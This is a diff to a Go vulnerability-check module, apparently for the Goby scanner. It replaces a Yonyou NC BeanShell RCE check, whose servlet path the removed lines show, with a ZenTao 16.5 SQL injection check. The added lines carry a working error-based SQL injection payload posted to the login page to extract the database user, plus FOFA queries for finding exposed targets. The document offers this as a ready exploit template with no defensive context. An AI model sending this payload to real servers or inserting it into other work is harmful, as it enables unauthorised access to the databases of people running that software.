@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "禅道 16.5 router.class.php SQL注入漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"易软天创-禅道系统\" || product=\"易软天创-禅道系统\"",
+  "GobyQuery": "app=\"易软天创-禅道系统\" || product=\"易软天创-禅道系统\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -29,12 +29,12 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "uri": "/user-login.html",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
-        "data": ""
+        "data": "account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%29%29%23"
       },
       "ResponseTest": {
         "type": "group",
@@ -42,16 +42,9 @@ func init() {
         "checks": [
           {
             "type": "item",
-            "variable": "$code",
-            "operation": "==",
-            "value": "200",
-            "bz": ""
-          },
-          {
-            "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "syntax error",
             "bz": ""
           }
         ]
@@ -107,7 +100,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "禅道 16.5 router.class.php SQL注入漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +109,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "zentao 16.5 router.class.php SQL injection",
       "Product": "",
       "Description": "",
       "Recommendation": "",
